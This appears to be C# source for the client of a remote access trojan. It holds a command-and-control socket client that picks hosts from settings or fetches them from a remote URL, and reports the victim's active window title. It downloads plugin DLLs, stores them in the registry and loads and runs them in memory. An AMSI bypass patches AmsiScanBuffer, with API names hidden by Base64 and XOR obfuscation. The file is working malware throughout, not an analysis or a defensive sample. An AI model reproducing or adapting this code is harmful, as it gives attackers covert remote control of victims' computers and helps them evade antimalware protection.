using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using MessagePackLib.MessagePack;

namespace Peg.ICARUS
{
    public static class PegSock
    {
        public static List<MsgPack> Packs = new List<MsgPack>();
        public static Socket TcpClient { get; set; }
        public static SslStream SslClient { get; set; }
        private static byte[] Buffer { get; set; }
        private static long HeaderSize { get; set; }
        private static long Offset { get; set; }
        private static Timer KeepAlive { get; set; }
        public static bool IsConnected { get; set; }
        private static object SendSync { get; } = new object();
        private static Timer Ping { get; set; }
        public static int Interval { get; set; }
        public static bool ActivatePo_ng { get; set; }

        public static void InitializeClient()
        {
            try
            {
                TcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    ReceiveBufferSize = 50 * 1024,
                    SendBufferSize = 50 * 1024
                };

                if (Settings.BinToGo == "null")
                {
                    var ServerIP = Settings.Hos_ts.Split(',')[new Random().Next(Settings.Hos_ts.Split(',').Length)];
                    var ServerPort =
                        Convert.ToInt32(
                            Settings.Por_ts.Split(',')[new Random().Next(Settings.Por_ts.Split(',').Length)]);

                    if (IsValidDomainName(ServerIP))
                    {
                        var addresslist = Dns.GetHostAddresses(ServerIP);

                        foreach (var theaddress in addresslist)
                            try
                            {
                                TcpClient.Connect(theaddress, ServerPort);
                                if (TcpClient.Connected) break;
                            }
                            catch
                            {
                            }
                    }
                    else
                    {
                        TcpClient.Connect(ServerIP, ServerPort);
                    }
                }
                else
                {
                    using (var wc = new WebClient())
                    {
                        var networkCredential = new NetworkCredential("", "");
                        wc.Credentials = networkCredential;
                        var resp = wc.DownloadString(Settings.BinToGo);
                        var spl = resp.Split(new[] { ":" }, StringSplitOptions.None);
                        Settings.Hos_ts = spl[0];
                        Settings.Por_ts = spl[new Random().Next(1, spl.Length)];
                        TcpClient.Connect(Settings.Hos_ts, Convert.ToInt32(Settings.Por_ts));
                    }
                }

                if (TcpClient.Connected)
                {
                    //Debug.WriteLine("Connected!");
                    IsConnected = true;
                    SslClient = new SslStream(new NetworkStream(TcpClient, true), false, ValidateServerCertificate);
                    SslClient.AuthenticateAsClient(TcpClient.RemoteEndPoint.ToString().Split(':')[0], null,
                        SslProtocols.Tls, false);
                    HeaderSize = 4;
                    Buffer = new byte[HeaderSize];
                    Offset = 0;
                    Send(IdSender.SendInfo());
                    Interval = 0;
                    ActivatePo_ng = false;
                    KeepAlive = new Timer(KeepAlivePacket, null, new Random().Next(10 * 1000, 15 * 1000),
                        new Random().Next(10 * 1000, 15 * 1000));
                    Ping = new Timer(Po_ng, null, 1, 1);
                    SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServertData, null);
                }
                else
                {
                    IsConnected = false;
                }
            }
            catch
            {
                //Debug.WriteLine("Disconnected!");
                IsConnected = false;
            }
        }

        private static bool IsValidDomainName(string name)
        {
            return Uri.CheckHostName(name) != UriHostNameType.Unknown;
        }

        private static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain,
            SslPolicyErrors sslPolicyErrors)
        {
#if DEBUG
            return true;
#endif
            return Settings.Server_Certificate.Equals(certificate);
            //return true;
        }

        public static void Reconnect()
        {
            try
            {
                Ping?.Dispose();
                KeepAlive?.Dispose();
                SslClient?.Dispose();
                TcpClient?.Dispose();
            }
            catch
            {
            }

            IsConnected = false;
        }

        public static void ReadServertData(IAsyncResult ar)
        {
            try
            {
                if (!TcpClient.Connected || !IsConnected)
                {
                    IsConnected = false;
                    return;
                }

                var recevied = SslClient.EndRead(ar);
                if (recevied > 0)
                {
                    Offset += recevied;
                    HeaderSize -= recevied;
                    if (HeaderSize == 0)
                    {
                        HeaderSize = BitConverter.ToInt32(Buffer, 0);
                        //Debug.WriteLine("/// Client Buffersize " + HeaderSize.ToString() + " Bytes  ///");
                        if (HeaderSize > 0)
                        {
                            Offset = 0;
                            Buffer = new byte[HeaderSize];
                            while (HeaderSize > 0)
                            {
                                var rc = SslClient.Read(Buffer, (int)Offset, (int)HeaderSize);
                                if (rc <= 0)
                                {
                                    IsConnected = false;
                                    return;
                                }

                                Offset += rc;
                                HeaderSize -= rc;
                                if (HeaderSize < 0)
                                {
                                    IsConnected = false;
                                    return;
                                }
                            }

                            var thread = new Thread(Read);
                            thread.Start(Buffer);
                            Offset = 0;
                            HeaderSize = 4;
                            Buffer = new byte[HeaderSize];
                        }
                        else
                        {
                            HeaderSize = 4;
                            Buffer = new byte[HeaderSize];
                            Offset = 0;
                        }
                    }
                    else if (HeaderSize < 0)
                    {
                        IsConnected = false;
                        return;
                    }

                    SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServertData, null);
                }
                else
                {
                    IsConnected = false;
                }
            }
            catch
            {
                IsConnected = false;
            }
        }

        public static void Send(byte[] msg)
        {
            lock (SendSync)
            {
                try
                {
                    if (!IsConnected) return;

                    var buffersize = BitConverter.GetBytes(msg.Length);
                    TcpClient.Poll(-1, SelectMode.SelectWrite);
                    SslClient.Write(buffersize, 0, buffersize.Length);

                    if (msg.Length > 1000000) //1mb
                    {
                        //Debug.WriteLine("send chunks");
                        using (var memoryStream = new MemoryStream(msg))
                        {
                            var read = 0;
                            memoryStream.Position = 0;
                            var chunk = new byte[50 * 1000];
                            while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                            {
                                TcpClient.Poll(-1, SelectMode.SelectWrite);
                                SslClient.Write(chunk, 0, read);
                                SslClient.Flush();
                            }
                        }
                    }
                    else
                    {
                        TcpClient.Poll(-1, SelectMode.SelectWrite);
                        SslClient.Write(msg, 0, msg.Length);
                        SslClient.Flush();
                    }
                }
                catch
                {
                    IsConnected = false;
                }
            }
        }

        public static void KeepAlivePacket(object obj)
        {
            try
            {
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "Ping";
                msgpack.ForcePathObject("Message").AsString = Me8odos.GetActiveWindowTitle();
                Send(msgpack.Encode2Bytes());
                GC.Collect();
                ActivatePo_ng = true;
            }
            catch
            {
            }
        }

        private static void Po_ng(object obj)
        {
            try
            {
                if (ActivatePo_ng && IsConnected) Interval++;
            }
            catch
            {
            }
        }

        public static string thebook(string str)
        {
            var ch1 = '\n';
            var stringBuilder = new StringBuilder();

            foreach (uint num in str.ToCharArray())
            {
                var ch2 = (char)(num ^ ch1);
                stringBuilder.Append(ch2);
            }

            return stringBuilder.ToString();
        }

        public static void Read(object data)
        {
            try
            {
                var unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                {
                    case "Po_ng":
                    {
                        ActivatePo_ng = false;
                        var msgPack = new MsgPack();
                        msgPack.ForcePathObject("Pac_ket").SetAsString("Po_ng");
                        msgPack.ForcePathObject("Message").SetAsInteger(Interval);
                        Send(msgPack.Encode2Bytes());
                        Interval = 0;
                        break;
                    }

                    case "plu_gin":
                    {
                        try
                        {
                            if (SetRegistry.GetValue(unpack_msgpack.ForcePathObject("Dll").AsString) == null)
                            {
                                Packs.Add(unpack_msgpack);
                                var msgPack = new MsgPack();
                                msgPack.ForcePathObject("Pac_ket").SetAsString(thebook("yodnZfmcd"));
                                msgPack.ForcePathObject("Hashes")
                                    .SetAsString(unpack_msgpack.ForcePathObject("Dll").AsString);
                                Send(msgPack.Encode2Bytes());
                            }
                            else
                            {
                                Invoke(unpack_msgpack);
                            }
                        }
                        catch (Exception ex)
                        {
                            Error(ex.Message);
                        }

                        break;
                    }

                    case "save_Plugin":
                    {
                        SetRegistry.SetValue(unpack_msgpack.ForcePathObject("Hash").AsString,
                            unpack_msgpack.ForcePathObject("Dll").GetAsBytes());
                        Debug.WriteLine("plugin saved");
                        foreach (var msgPack in Packs.ToList())
                            if (msgPack.ForcePathObject("Dll").AsString ==
                                unpack_msgpack.ForcePathObject("Hash").AsString)
                            {
                                Invoke(msgPack);
                                Packs.Remove(msgPack);
                            }

                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }

        private static void Invoke(MsgPack unpack_msgpack)
        {
            var assembly =
                AppDomain.CurrentDomain.Load(
                    Zip.Decompress(SetRegistry.GetValue(unpack_msgpack.ForcePathObject("Dll").AsString)));
            var type = assembly.GetType(thebook("Zfmcd$Zfmcd"));
            dynamic instance = Activator.CreateInstance(type);
            instance.Run(TcpClient, Settings.Server_Certificate, Settings.Hw_id,
                unpack_msgpack.ForcePathObject("Msgpack").GetAsBytes(), MutexControl.currentApp, Settings.MTX,
                Settings.ODBS, Settings.Egkatastash);
            Received();
        }

        private static void Received()
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString =
                Encoding.Default.GetString(Convert.FromBase64String("UmVjZWl2ZWQ="));
            Send(msgpack.Encode2Bytes());
            Thread.Sleep(1000);
        }

        public static void Error(string ex)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Send(msgpack.Encode2Bytes());
        }
    }

    public class IMSA
    {
        public static void Abyss()
        {
            var x64 = "uFcA";
            x64 = x64 + "B4DD";
            var x86 = "uFcAB4";
            x86 = x86 + "DCGAA=";
            if (is64Bit())
                PatchA(Convert.FromBase64String(x64));
            else
                PatchA(Convert.FromBase64String(x86));
        }

        private static void PatchA(byte[] patch)
        {
            try
            {
                var liba = Encoding.Default.GetString(Convert.FromBase64String("YW1zaS5kbGw="));
                var lib = Win32.LoadLibraryA(ref liba);
                var addra = Encoding.Default.GetString(Convert.FromBase64String("QW1zaVNjYW5CdWZmZXI="));
                var addr = Win32.GetProcAddress(lib, ref addra);

                uint oldProtect;
                Win32.VirtualAllocEx(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);

                Marshal.Copy(patch, 0, addr, patch.Length);
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
                Console.WriteLine(" [x] {0}", e.InnerException);
            }
        }

        private static bool is64Bit()
        {
            var is64Bit = true;

            if (IntPtr.Size == 4)
                is64Bit = false;

            return is64Bit;
        }
    }

    internal class Win32
    {
        public delegate int DelegateVirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect,
            out uint lpflOldProtect);

        public static readonly DelegateVirtualProtect VirtualAllocEx = LoadApi<DelegateVirtualProtect>("kernel32",
            Encoding.Default.GetString(Convert.FromBase64String("VmlydHVhbFByb3RlY3Q="))); //VirtualProtect

        #region CreateAPI

        [DllImport("kernel32", SetLastError = true)]
        public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

        [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr GetProcAddress(IntPtr hProcess,
            [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

        public static CreateApi LoadApi<CreateApi>(string name, string method)
        {
            return (CreateApi)(object)Marshal.GetDelegateForFunctionPointer(
                GetProcAddress(LoadLibraryA(ref name), ref method), typeof(CreateApi));
        }

        #endregion
    }
}